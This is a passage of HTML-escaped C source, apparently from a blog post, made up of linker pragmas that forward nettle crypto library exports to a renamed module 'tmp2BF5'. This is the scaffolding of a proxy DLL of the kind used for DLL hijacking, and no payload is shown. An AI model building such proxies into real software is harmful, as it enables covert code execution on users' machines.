class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256&#x3D;tmp2BF5.nettle_gcm_camellia256,@276&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_decrypt&#x3D;tmp2BF5.nettle_gcm_camellia256_decrypt,@277&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_digest&#x3D;tmp2BF5.nettle_gcm_camellia256_digest,@278&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_encrypt&#x3D;tmp2BF5.nettle_gcm_camellia256_encrypt,@279&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_set_iv&#x3D;tmp2BF5.nettle_gcm_camellia256_set_iv,@280&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_set_key&#x3D;tmp2BF5.nettle_gcm_camellia256_set_key,@281&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia256_update&#x3D;tmp2BF5.nettle_gcm_camellia256_update,@282&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_decrypt&#x3D;tmp2BF5.nettle_gcm_decrypt,@283&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_digest&#x3D;tmp2BF5.nettle_gcm_digest,@284&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_encrypt&#x3D;tmp2BF5.nettle_gcm_encrypt,@285&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_set_iv&#x3D;tmp2BF5.nettle_gcm_set_iv,@286&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_set_key&#x3D;tmp2BF5.nettle_gcm_set_key,@287&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_update&#x3D;tmp2BF5.nettle_gcm_update,@288&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_aeads&#x3D;tmp2BF5.nettle_get_aeads,@289&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_armors&#x3D;tmp2BF5.nettle_get_armors,@290&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_ciphers&#x3D;tmp2BF5.nettle_get_ciphers,@291&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_hashes&#x3D;tmp2BF5.nettle_get_hashes,@292&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_get_macs&#x3D;tmp2BF5.nettle_get_macs,@293&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94&#x3D;tmp2BF5.nettle_gosthash94,@294&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94_digest&#x3D;tmp2BF5.nettle_gosthash94_digest,@295&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94_init&#x3D;tmp2BF5.nettle_gosthash94_init,@296&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94_update&#x3D;tmp2BF5.nettle_gosthash94_update,@297&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94cp&#x3D;tmp2BF5.nettle_gosthash94cp,@298&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94cp_digest&#x3D;tmp2BF5.nettle_gosthash94cp_digest,@299&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gosthash94cp_update&#x3D;tmp2BF5.nettle_gosthash94cp_update,@300&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hkdf_expand&#x3D;tmp2BF5.nettle_hkdf_expand,@301&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hkdf_extract&#x3D;tmp2BF5.nettle_hkdf_extract,@302&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_digest&#x3D;tmp2BF5.nettle_hmac_digest,@303&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94_digest&#x3D;tmp2BF5.nettle_hmac_gosthash94_digest,@304&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94_set_key&#x3D;tmp2BF5.nettle_hmac_gosthash94_set_key,@305&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94_update&#x3D;tmp2BF5.nettle_hmac_gosthash94_update,@306&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94cp_digest&#x3D;tmp2BF5.nettle_hmac_gosthash94cp_digest,@307&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94cp_set_key&#x3D;tmp2BF5.nettle_hmac_gosthash94cp_set_key,@308&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_gosthash94cp_update&#x3D;tmp2BF5.nettle_hmac_gosthash94cp_update,@309&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5&#x3D;tmp2BF5.nettle_hmac_md5,@310&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5_digest&#x3D;tmp2BF5.nettle_hmac_md5_digest,@311&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5_set_key&#x3D;tmp2BF5.nettle_hmac_md5_set_key,@312&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_md5_update&#x3D;tmp2BF5.nettle_hmac_md5_update,@313&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160&#x3D;tmp2BF5.nettle_hmac_ripemd160,@314&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160_digest&#x3D;tmp2BF5.nettle_hmac_ripemd160_digest,@315&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160_set_key&#x3D;tmp2BF5.nettle_hmac_ripemd160_set_key,@316&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_ripemd160_update&#x3D;tmp2BF5.nettle_hmac_ripemd160_update,@317&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_set_key&#x3D;tmp2BF5.nettle_hmac_set_key,@318&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1&#x3D;tmp2BF5.nettle_hmac_sha1,@319&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1_digest&#x3D;tmp2BF5.nettle_hmac_sha1_digest,@320&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1_set_key&#x3D;tmp2BF5.nettle_hmac_sha1_set_key,@321&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha1_update&#x3D;tmp2BF5.nettle_hmac_sha1_update,@322&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha224&#x3D;tmp2BF5.nettle_hmac_sha224,@323&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha224_digest&#x3D;tmp2BF5.nettle_hmac_sha224_digest,@324&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha224_set_key&#x3D;tmp2BF5.nettle_hmac_sha224_set_key,@325&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256&#x3D;tmp2BF5.nettle_hmac_sha256,@326&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256_digest&#x3D;tmp2BF5.nettle_hmac_sha256_digest,@327&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256_set_key&#x3D;tmp2BF5.nettle_hmac_sha256_set_key,@328&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha256_update&#x3D;tmp2BF5.nettle_hmac_sha256_update,@329&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha384&#x3D;tmp2BF5.nettle_hmac_sha384,@330&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha384_digest&#x3D;tmp2BF5.nettle_hmac_sha384_digest,@331&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha384_set_key&#x3D;tmp2BF5.nettle_hmac_sha384_set_key,@332&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512&#x3D;tmp2BF5.nettle_hmac_sha512,@333&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512_digest&#x3D;tmp2BF5.nettle_hmac_sha512_digest,@334&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512_set_key&#x3D;tmp2BF5.nettle_hmac_sha512_set_key,@335&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_sha512_update&#x3D;tmp2BF5.nettle_hmac_sha512_update,@336&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_hmac_update&#x3D;tmp2BF5.nettle_hmac_update,@337&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_get&#x3D;tmp2BF5.nettle_knuth_lfib_get,@338&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_get_array&#x3D;tmp2BF5.nettle_knuth_lfib_get_array,@339&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_init&#x3D;tmp2BF5.nettle_knuth_lfib_init,@340&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_knuth_lfib_random&#x3D;tmp2BF5.nettle_knuth_lfib_random,@341&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_lookup_hash&#x3D;tmp2BF5.nettle_lookup_hash,@342&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2&#x3D;tmp2BF5.nettle_md2,@343&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2_digest&#x3D;tmp2BF5.nettle_md2_digest,@344&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2_init&#x3D;tmp2BF5.nettle_md2_init,@345&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md2_update&#x3D;tmp2BF5.nettle_md2_update,@346&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4&#x3D;tmp2BF5.nettle_md4,@347&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4_digest&#x3D;tmp2BF5.nettle_md4_digest,@348&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4_init&#x3D;tmp2BF5.nettle_md4_init,@349&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md4_update&#x3D;tmp2BF5.nettle_md4_update,@350&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5&#x3D;tmp2BF5.nettle_md5,@351&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_compress&#x3D;tmp2BF5.nettle_md5_compress,@352&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_digest&#x3D;tmp2BF5.nettle_md5_digest,@353&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_init&#x3D;tmp2BF5.nettle_md5_init,@354&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_md5_update&#x3D;tmp2BF5.nettle_md5_update,@355&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_memeql_sec&#x3D;tmp2BF5.nettle_memeql_sec,@356&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_memxor&#x3D;tmp2BF5.nettle_memxor,@357&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_memxor3&#x3D;tmp2BF5.nettle_memxor3,@358&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2&#x3D;tmp2BF5.nettle_pbkdf2,@359&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2_hmac_gosthash94cp&#x3D;tmp2BF5.nettle_pbkdf2_hmac_gosthash94cp,@360&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2_hmac_sha1&#x3D;tmp2BF5.nettle_pbkdf2_hmac_sha1,@361&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_pbkdf2_hmac_sha256&#x3D;tmp2BF5.nettle_pbkdf2_hmac_sha256,@362&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_digest&#x3D;tmp2BF5.nettle_poly1305_aes_digest,@363&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_set_key&#x3D;tmp2BF5.nettle_poly1305_aes_set_key,@364&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_set_nonce&#x3D;tmp2BF5.nettle_poly1305_aes_set_nonce,@365&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_poly1305_aes_update&#x3D;tmp2BF5.nettle_poly1305_aes_update,@366&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_realloc&#x3D;tmp2BF5.nettle_realloc,@367&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160&#x3D;tmp2BF5.nettle_ripemd160,@368&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160_digest&#x3D;tmp2BF5.nettle_ripemd160_digest,@369&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160_init&#x3D;tmp2BF5.nettle_ripemd160_init,@370&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ripemd160_update&#x3D;tmp2BF5.nettle_ripemd160_update,@371&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_128_set_key&#x3D;tmp2BF5.nettle_salsa20_128_set_key,@372&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_256_set_key&#x3D;tmp2BF5.nettle_salsa20_256_set_key,@373&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_crypt&#x3D;tmp2BF5.nettle_salsa20_crypt,@374&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_set_key&#x3D;tmp2BF5.nettle_salsa20_set_key,@375&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20_set_nonce&#x3D;tmp2BF5.nettle_salsa20_set_nonce,@376&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_salsa20r12_crypt&#x3D;tmp2BF5.nettle_salsa20r12_crypt,@377&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent128&#x3D;tmp2BF5.nettle_serpent128,@378&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent128_set_key&#x3D;tmp2BF5.nettle_serpent128_set_key,@379&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent192&#x3D;tmp2BF5.nettle_serpent192,@380&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent192_set_key&#x3D;tmp2BF5.nettle_serpent192_set_key,@381&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent256&#x3D;tmp2BF5.nettle_serpent256,@382&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent256_set_key&#x3D;tmp2BF5.nettle_serpent256_set_key,@383&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent_decrypt&#x3D;tmp2BF5.nettle_serpent_decrypt,@384&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent_encrypt&#x3D;tmp2BF5.nettle_serpent_encrypt,@385&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_serpent_set_key&#x3D;tmp2BF5.nettle_serpent_set_key,@386&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1&#x3D;tmp2BF5.nettle_sha1,@387&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_compress&#x3D;tmp2BF5.nettle_sha1_compress,@388&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_digest&#x3D;tmp2BF5.nettle_sha1_digest,@389&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_init&#x3D;tmp2BF5.nettle_sha1_init,@390&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha1_update&#x3D;tmp2BF5.nettle_sha1_update,@391&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha224&#x3D;tmp2BF5.nettle_sha224,@392&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha224_digest&#x3D;tmp2BF5.nettle_sha224_digest,@393&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha224_init&#x3D;tmp2BF5.nettle_sha224_init,@394&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256&#x3D;tmp2BF5.nettle_sha256,@395&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256_digest&#x3D;tmp2BF5.nettle_sha256_digest,@396&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256_init&#x3D;tmp2BF5.nettle_sha256_init,@397&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha256_update&#x3D;tmp2BF5.nettle_sha256_update,@398&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha384&#x3D;tmp2BF5.nettle_sha384,@399&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha384_digest&#x3D;tmp2BF5.nettle_sha384_digest,@400&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha384_init&#x3D;tmp2BF5.nettle_sha384_init,@401&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224&#x3D;tmp2BF5.nettle_sha3_224,@402&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224_digest&#x3D;tmp2BF5.nettle_sha3_224_digest,@403&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224_init&#x3D;tmp2BF5.nettle_sha3_224_init,@404&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_224_update&#x3D;tmp2BF5.nettle_sha3_224_update,@405&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256&#x3D;tmp2BF5.nettle_sha3_256,@406&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_digest&#x3D;tmp2BF5.nettle_sha3_256_digest,@407&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_init&#x3D;tmp2BF5.nettle_sha3_256_init,@408&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_shake&#x3D;tmp2BF5.nettle_sha3_256_shake,@409&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_256_update&#x3D;tmp2BF5.nettle_sha3_256_update,@410&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384&#x3D;tmp2BF5.nettle_sha3_384,@411&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384_digest&#x3D;tmp2BF5.nettle_sha3_384_digest,@412&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384_init&#x3D;tmp2BF5.nettle_sha3_384_init,@413&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_384_update&#x3D;tmp2BF5.nettle_sha3_384_update,@414&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512&#x3D;tmp2BF5.nettle_sha3_512,@415&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512_digest&#x3D;tmp2BF5.nettle_sha3_512_digest,@416&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512_init&#x3D;tmp2BF5.nettle_sha3_512_init,@417&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_512_update&#x3D;tmp2BF5.nettle_sha3_512_update,@418&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha3_permute&#x3D;tmp2BF5.nettle_sha3_permute,@419&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512&#x3D;tmp2BF5.nettle_sha512,@420&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_224&#x3D;tmp2BF5.nettle_sha512_224,@421&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_224_digest&#x3D;tmp2BF5.nettle_sha512_224_digest,@422&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_224_init&#x3D;tmp2BF5.nettle_sha512_224_init,@423&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_256&#x3D;tmp2BF5.nettle_sha512_256,@424&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_256_digest&#x3D;tmp2BF5.nettle_sha512_256_digest,@425&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_256_init&#x3D;tmp2BF5.nettle_sha512_256_init,@426&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_digest&#x3D;tmp2BF5.nettle_sha512_digest,@427&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_init&#x3D;tmp2BF5.nettle_sha512_init,@428&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_sha512_update&#x3D;tmp2BF5.nettle_sha512_update,@429&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes128_decrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes128_decrypt_message,@430&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes128_encrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes128_encrypt_message,@431&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes128_set_key&#x3D;tmp2BF5.nettle_siv_cmac_aes128_set_key,@432&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes256_decrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes256_decrypt_message,@433&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes256_encrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_aes256_encrypt_message,@434&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_aes256_set_key&#x3D;tmp2BF5.nettle_siv_cmac_aes256_set_key,@435&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_decrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_decrypt_message,@436&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_encrypt_message&#x3D;tmp2BF5.nettle_siv_cmac_encrypt_message,@437&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_siv_cmac_set_key&#x3D;tmp2BF5.nettle_siv_cmac_set_key,@438&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish128&#x3D;tmp2BF5.nettle_twofish128,@439&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish128_set_key&#x3D;tmp2BF5.nettle_twofish128_set_key,@440&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish192&#x3D;tmp2BF5.nettle_twofish192,@441&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish192_set_key&#x3D;tmp2BF5.nettle_twofish192_set_key,@442&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish256&#x3D;tmp2BF5.nettle_twofish256,@443&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish256_set_key&#x3D;tmp2BF5.nettle_twofish256_set_key,@444&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish_decrypt&#x3D;tmp2BF5.nettle_twofish_decrypt,@445&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish_encrypt&#x3D;tmp2BF5.nettle_twofish_encrypt,@446&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_twofish_set_key&#x3D;tmp2BF5.nettle_twofish_set_key,@447&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_digest&#x3D;tmp2BF5.nettle_umac128_digest,@448&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_set_key&#x3D;tmp2BF5.nettle_umac128_set_key,@449&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_set_nonce&#x3D;tmp2BF5.nettle_umac128_set_nonce,@450&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_update&#x3D;tmp2BF5.nettle_umac128_update,@451&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_digest&#x3D;tmp2BF5.nettle_umac32_digest,@452&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_set_key&#x3D;tmp2BF5.nettle_umac32_set_key,@453&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_set_nonce&#x3D;tmp2BF5.nettle_umac32_set_nonce,@454&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_update&#x3D;tmp2BF5.nettle_umac32_update,@455&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_digest&#x3D;tmp2BF5.nettle_umac64_digest,@456&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_set_key&#x3D;tmp2BF5.nettle_umac64_set_key,@457&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_set_nonce&#x3D;tmp2BF5.nettle_umac64_set_nonce,@458&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_update&#x3D;tmp2BF5.nettle_umac64_update,@459&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_digest&#x3D;tmp2BF5.nettle_umac96_digest,@460&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_set_key&#x3D;tmp2BF5.nettle_umac96_set_key,@461&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_set_nonce&#x3D;tmp2BF5.nettle_umac96_set_nonce,@462&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_update&#x3D;tmp2BF5.nettle_umac96_update,@463&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_version_major&#x3D;tmp2BF5.nettle_version_major,@464&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_version_minor&#x3D;tmp2BF5.nettle_version_minor,@465&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xrealloc&#x3D;tmp2BF5.nettle_xrealloc,@466&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes128_decrypt_message&#x3D;tmp2BF5.nettle_xts_aes128_decrypt_message,@467&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes128_encrypt_message&#x3D;tmp2BF5.nettle_xts_aes128_encrypt_message,@468&quot;)</span><br><span class="line">#pragma comment(linker, 